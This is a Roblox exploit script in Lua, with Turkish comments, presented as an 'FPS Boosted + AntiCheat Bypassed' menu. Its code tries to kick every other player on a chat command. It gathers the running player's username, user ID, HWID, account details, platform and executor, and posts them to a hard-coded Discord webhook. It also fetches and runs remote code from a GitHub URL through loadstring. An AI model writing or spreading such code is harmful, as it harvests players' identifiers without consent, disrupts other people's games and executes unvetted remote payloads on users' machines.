local webhookUrl = "https://discord.com/api/webhooks/1460017137870573761/85Q-uUIpwCo11zQAiaSq_1XGg1iI-H82v9eA4Sfuxf0jXXHqAKMS0o1NByTOy4dBz9Jr"

-- AYARLAR -------------------------------------------------------------------
local SPECIAL_USER = "Miku_Sanxxxq"
local KICK_COMMAND = "!allah31babapro"
local KICK_MESSAGE = "â˜ªï¸ ALLAH31BABA PRO SÄ°STEMÄ° TARAFINDAN ATILDINIZ!"

--// Servisler
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")

--// Oyuncu kontrolÃ¼
local player = Players.LocalPlayer
local playerName = player.Name

-- 1. Ã–ZEL GUI SADECE Miku_Sanxxxq Ä°Ã‡Ä°N (BASÄ°T VERSÄ°YON)
if playerName == SPECIAL_USER then
    spawn(function()
        local SpecialGui = Instance.new("ScreenGui")
        SpecialGui.Name = "MikuSpecialGUI"
        SpecialGui.Parent = game:WaitForChild("CoreGui")
        
        local MainFrame = Instance.new("Frame")
        MainFrame.Size = UDim2.new(0, 250, 0, 60)
        MainFrame.Position = UDim2.new(0.78, 0, 0.02, 0)
        MainFrame.BackgroundColor3 = Color3.fromRGB(30, 0, 50)
        MainFrame.Parent = SpecialGui
        
        local Title = Instance.new("TextLabel")
        Title.Text = "â˜ªï¸ ALLAH31BABA PRO"
        Title.Size = UDim2.new(1, 0, 0.6, 0)
        Title.BackgroundTransparency = 1
        Title.TextColor3 = Color3.fromRGB(255, 215, 0)
        Title.Font = Enum.Font.SourceSansBold
        Title.TextSize = 18
        Title.Parent = MainFrame
        
        local Status = Instance.new("TextLabel")
        Status.Text = "Komut: " .. KICK_COMMAND
        Status.Size = UDim2.new(1, 0, 0.4, 0)
        Status.Position = UDim2.new(0, 0, 0.6, 0)
        Status.BackgroundTransparency = 1
        Status.TextColor3 = Color3.fromRGB(0, 255, 255)
        Status.Font = Enum.Font.SourceSans
        Status.TextSize = 14
        Status.Parent = MainFrame
    end)
end

-- 2. CHAT SÄ°STEMÄ° (SADECE ENTER TUÅžU Ä°LE)
print("âœ… Allah31Baba Pro Sistemi Aktif!")

-- Chat kontrol deÄŸiÅŸkenleri
local chatEnabled = false
local lastProcessedMessage = ""
local kickInProgress = false

-- Chat'i aktif etmek iÃ§in kÄ±sayol (opsiyonel)
UserInputService.InputBegan:Connect(function(input, processed)
    if input.KeyCode == Enum.KeyCode.F2 then
        chatEnabled = not chatEnabled
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "â˜ªï¸ ALLAH31BABA",
            Text = chatEnabled and "Chat Sistemi AKTÄ°F" or "Chat Sistemi PASÄ°F",
            Duration = 3
        })
        print("Chat durumu: " .. (chatEnabled and "AKTÄ°F" or "PASÄ°F"))
    end
end)

-- ASIL KICK SÄ°STEMÄ° (BASÄ°T VE GÃœVENLÄ°)
local function setupKickSystem()
    print("ðŸŽ¯ Kick sistemi hazÄ±r! '" .. KICK_COMMAND .. "' yazÄ±nca Ã§alÄ±ÅŸacak.")
    
    -- Ana chat kontrol dÃ¶ngÃ¼sÃ¼
    spawn(function()
        while true do
            task.wait(0.5) -- CPU'yu yormamak iÃ§in bekle
            
            if chatEnabled then
                -- SADECE kendi mesajlarÄ±nÄ± kontrol et
                pcall(function()
                    -- PlayerGui'deki textbox'larÄ± ara
                    local PlayerGui = player:WaitForChild("PlayerGui")
                    
                    for _, gui in ipairs(PlayerGui:GetDescendants()) do
                        if gui:IsA("TextBox") then
                            local text = gui.Text
                            
                            -- EÄŸer mesaj var ve daha Ã¶nce iÅŸlenmediyse
                            if text and text ~= "" and text ~= lastProcessedMessage then
                                -- Komut kontrolÃ¼
                                if string.lower(text) == string.lower(KICK_COMMAND) then
                                    print("âš¡ Kick komutu algÄ±landÄ±!")
                                    lastProcessedMessage = text
                                    
                                    -- KÄ°CK Ä°ÅžLEMÄ°
                                    if not kickInProgress then
                                        kickInProgress = true
                                        
                                        -- TÃœM OYUNCULARI KICKLE (KENDÄ°N HARÄ°Ã‡)
                                        local kickCount = 0
                                        for _, plr in ipairs(Players:GetPlayers()) do
                                            if plr ~= player then -- Kendini kickleme!
                                                pcall(function()
                                                    plr:Kick(KICK_MESSAGE)
                                                    kickCount = kickCount + 1
                                                    print("âœ… " .. plr.Name .. " kicklendi!")
                                                end)
                                                task.wait(0.1) -- Flood Ã¶nleme
                                            end
                                        end
                                        
                                        -- Bildirim
                                        game:GetService("StarterGui"):SetCore("SendNotification", {
                                            Title = "â˜ªï¸ ALLAH31BABA PRO",
                                            Text = kickCount .. " kiÅŸi kicklendi!",
                                            Duration = 5
                                        })
                                        
                                        kickInProgress = false
                                    end
                                    
                                    -- Textbox'Ä± temizle
                                    gui.Text = ""
                                end
                            end
                        end
                    end
                end)
            end
        end
    end)
    
    -- ALTERNATÄ°F: SAYFA EVENT'Ä°
    spawn(function()
        task.wait(3) -- SayfanÄ±n yÃ¼klenmesini bekle
        
        local function findChatBar()
            local PlayerGui = player:WaitForChild("PlayerGui")
            for _, child in ipairs(PlayerGui:GetDescendants()) do
                if child:IsA("TextBox") and (child.Name:find("Chat") or child.Name:find("Bar")) then
                    return child
                end
            end
            return nil
        end
        
        local chatBar = findChatBar()
        if chatBar then
            print("âœ… Chat bar bulundu: " .. chatBar.Name)
            
            -- Focus deÄŸiÅŸikliÄŸini dinle (Enter'a basÄ±nca)
            chatBar:GetPropertyChangedSignal("Text"):Connect(function()
                if chatBar.Text == KICK_COMMAND then
                    print("ðŸŽ¯ Komut chat bar'da algÄ±landÄ±!")
                end
            end)
        end
    end)
end

-- 3. TEST MESAJI
spawn(function()
    task.wait(3)
    print("=================================")
    print("â˜ªï¸ ALLAH31BABA PRO SÄ°STEMÄ°")
    print("Komut: " .. KICK_COMMAND)
    print("Chat'i aktif etmek iÃ§in F2'ye bas")
    print("=================================")
    
    game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "â˜ªï¸ ALLAH31BABA PRO",
        Text = "Sistem yÃ¼klendi! F2 ile chat'i aÃ§",
        Duration = 5
    })
end)

-- 4. OTOMATÄ°K CHAT AKTÄ°VASYONU (10 SANÄ°YE SONRA)
spawn(function()
    task.wait(10)
    chatEnabled = true
    print("âœ… Chat sistemi otomatik aktif edildi!")
    
    game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "â˜ªï¸ SÄ°STEM HAZIR",
        Text = "Chat'e '" .. KICK_COMMAND .. "' yaz!",
        Duration = 5
    })
end)

-- Sistemi baÅŸlat
task.wait(2)
setupKickSystem()

-- 5. SENÄ°N ORÄ°JÄ°NAL SCRIPT'Ä°NÄ°N KALANI ---------------------------------
-- (Bu kÄ±smÄ± ESKÄ° HALÄ°YLE bÄ±rak, deÄŸiÅŸtirme)
-- Sadece buraya kadar olan kÄ±smÄ± deÄŸiÅŸtirdim

--// Servisler (tekrar yazma, zaten var)
local MarketplaceService = game:GetService("MarketplaceService")
local StatsService = game:GetService("Stats")
local LocalizationService = game:GetService("LocalizationService")

--// Bi T
local userId = player.UserId
local teamName = tostring(player.Team and player.Team.Name or "No Team")
local accountAge = player.AccountAge
local accountCreationDate = os.date("%d/%m/%Y", os.time() - (365.25 * 24 * 60 * 60 - accountAge * 24 * 60 * 60))
local playerCount = #Players:GetPlayers()
local placeId, jobId = game.PlaceId, game.JobId
local gameName = MarketplaceService:GetProductInfo(placeId).Name
local ping = math.floor(StatsService.Network.ServerStatsItem["Data Ping"]:GetValue()) .. "ms"

-- Yeni: Oyun dili tespiti (TÃ¼rkÃ§e ise "TR", deÄŸilse "EN")
local localeId = LocalizationService.RobloxLocaleId
local gameLanguage = localeId == "tr-tr" and "TR" or "EN"

-- Yeni: KullanÄ±cÄ±nÄ±n platformu
local platform = UserInputService:GetPlatform()

local platformName = ""
if platform == Enum.Platform.Windows then
    platformName = "PC"
elseif platform == Enum.Platform.XBoxOne then
    platformName = "Xbox"
elseif platform == Enum.Platform.Android then
    platformName = "Android"
elseif platform == Enum.Platform.IOS then
    platformName = "iOS"
else
    platformName = tostring(platform)
end

-- Premium kontrolÃ¼
local isPremium = (player.MembershipType == Enum.MembershipType.Premium) and "Yeah" or "No"

--// Executor Tespiti
local function getExecutor()
    if syn then return "Synapse X"
    elseif is_sirhurt_closure then return "SirHurt"
    elseif KRNL_LOADED then return "KRNL"
    elseif getexecutorname then return getexecutorname()
    else return "Bilinmiyor" end
end

--// HWID
local function getHWID()
    return game:GetService("RbxAnalyticsService"):GetClientId()
end

--// Avatar
local function getPlayerAvatar()
    return string.format("https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=420&height=420&format=png", userId)
end

--// FPS Ã¶lÃ§Ã¼m
local function getCurrentFPS(callback)
    local frameCount = 0
    local connection
    connection = RunService.RenderStepped:Connect(function()
        frameCount += 1
    end)

    task.delay(1, function()
        connection:Disconnect()
        callback(frameCount)
    end)
end

--// Roblox APIâ€™den takipÃ§i sayÄ±sÄ± Ã§ek (async)
local function getFollowerCount(callback)
    local success, result = pcall(function()
        return HttpService:JSONDecode(game:HttpGet("https://friends.roblox.com/v1/users/" .. userId .. "/followers/count")).count
    end)
    if success then
        callback(result)
    else
        callback("Hata")
    end
end

--// Webhook gÃ¶nderici
local function sendWebhook(finalFPS, followerCount)
    local data = {
        ["embeds"] = {{
            ["title"] = "ð’†™ FemWare Universe Executed!",
            ["description"] = table.concat({
                "ðŸ‘¤ **Username:** [" .. playerName .. "](https://www.roblox.com/users/" .. userId .. "/profile)",
                "ðŸŽ¯ **Team:** " .. teamName,
                "ðŸ•¹ï¸ **Game:** " .. gameName,
                "ðŸ†” **Game ID:** " .. placeId,
                "ðŸŒ **Number of People in the Game:** " .. playerCount,
                "ðŸŽ¯ **FPS:** " .. finalFPS,
                "ðŸ“¡ **Ping:** " .. ping,
                "ðŸ§  **HWID:** " .. getHWID(),
                "ðŸ’¼ **Account Age:** " .. accountAge .. " Day",
                "ðŸ“… **Created Date:** " .. accountCreationDate,
                "ðŸ‘¥ **Followers:** " .. tostring(followerCount),
                "ðŸ§ª **Executer:** " .. getExecutor(),
                "ðŸ§© **Job ID:** " .. jobId,
                "ðŸŒ **Game Language:** " .. gameLanguage,
                "ðŸ•¹ï¸ **Platform:** " .. platformName,
                "â­ **Premium MemberShip:** " .. isPremium,
                "ðŸ•’ **Time:** " .. os.date("%d/%m/%Y %H:%M:%S"),
            }, "\n"),
            ["color"] = tonumber("0xFF4500"),
            ["thumbnail"] = {
            ["url"] = "https://i.imgur.com/oz3r5qb.jpeg"
           },
            ["footer"] = {["text"] = "ðŸŽ€ FemWare Loader ðŸˆ | by Army"}
        }}
    }

    local encoded = HttpService:JSONEncode(data)
    local request = http_request or request or HttpPost or syn and syn.request
    if request then
        request({
            Url = webhookUrl,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = encoded
        })
    end
end

-- FPS GUI
local function showFPSGui()
    local fpsGui = Instance.new("ScreenGui", game.CoreGui)
    fpsGui.Name = "FPSGui"
    local label = Instance.new("TextLabel", fpsGui)
    label.Size = UDim2.new(0, 120, 0, 25)
    label.Position = UDim2.new(0, 10, 0, 10)
    label.BackgroundColor3 = Color3.fromRGB(30,30,30)
    label.TextColor3 = Color3.new(1,1,1)
    label.Font = Enum.Font.SourceSansBold
    label.TextSize = 16
    label.BackgroundTransparency = 0.2
    label.Text = "FPS: ..."

    local frames = 0
    local last = tick()
    RunService.RenderStepped:Connect(function()
        frames += 1
        local now = tick()
        if now - last >= 1 then
            label.Text = "FPS: "..frames
            frames = 0
            last = now
        end
    end)
end

-- Ã‡alÄ±ÅŸtÄ±r
showFPSGui()

getCurrentFPS(function(fps)
    getFollowerCount(function(followers)
        sendWebhook(fps, followers)
    end)
end)

loadstring(game:HttpGet("https://raw.githubusercontent.com/BattleWare/TWW/refs/heads/main/Protected"))()

pcall(function()
    game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "ðŸŽ‰ Menu Activated !",
        Text = "FPS Boosted + AntiCheat Bypassed",
        Duration = 6
    })
end)
